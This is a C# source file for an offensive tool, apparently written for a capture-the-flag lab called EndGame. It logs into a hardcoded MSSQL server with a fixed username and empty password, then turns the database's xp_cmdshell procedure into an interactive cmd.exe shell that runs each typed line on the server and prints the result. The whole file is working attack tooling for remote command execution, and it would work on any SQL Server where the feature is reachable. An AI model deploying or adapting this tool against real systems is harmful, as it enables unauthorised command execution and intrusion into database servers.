using System;
using System.Data;
using System.Data.SqlClient;
using System.IO;
namespace xp_cmdshell
{
	class Program
	{
		public static SqlConnection conn = new SqlConnection();
		//Console.SetIn(new StreamReader(Console.OpenStandardInput(8192)));
		//
		static void Main(string[] args)
		{
			// Increase the buffer size of the Console.ReadLine(), default 254 characters
			Console.SetIn(new StreamReader(Console.OpenStandardInput(8192)));
			//
			Console.WriteLine("[+] Tool created for EndGame by PlainText");
			Console.WriteLine("[+] Twitter: @JulioUrena");
			Console.WriteLine("[+] Connecting to Database...");
			try
			{
				// Database Connection
				string pass = "";
				conn.ConnectionString = "Server=10.13.38.11; Database=flag;" + "UserId=plaintext;" + "Password=" + pass + ";";
				conn.Open();
				Console.WriteLine("[+] Connection Success");
			}
			catch
			{
				Console.WriteLine("[-] Connection Fail");
				Environment.Exit(0);
			}
			Console.WriteLine("[+] You have now a cmd.exe shell using xp_cmdshell\n");
			bool open = true;
			string cmd = "";
			string output = "";
			var dataSet = new DataSet();
			while (open)
			{
				cmd = Console.ReadLine();
				var xp_cmd = new SqlCommand(@"EXEC master..xp_cmdshell @cmd", conn);
				xp_cmd.Parameters.AddWithValue("@cmd", cmd);
				var dataAdapter = new SqlDataAdapter { SelectCommand = xp_cmd };
				dataAdapter.Fill(dataSet);
				foreach(DataRow row in dataSet.Tables[0].Rows)
				{
					foreach (object item in row.ItemArray)
					{
						output = item.ToString();
						Console.WriteLine(output);
					}
				}
			//Console.WriteLine(output);
			dataSet.Clear();
			if (cmd == "exit")
				open = false;
			}
			conn.Close();
		}
	}
}
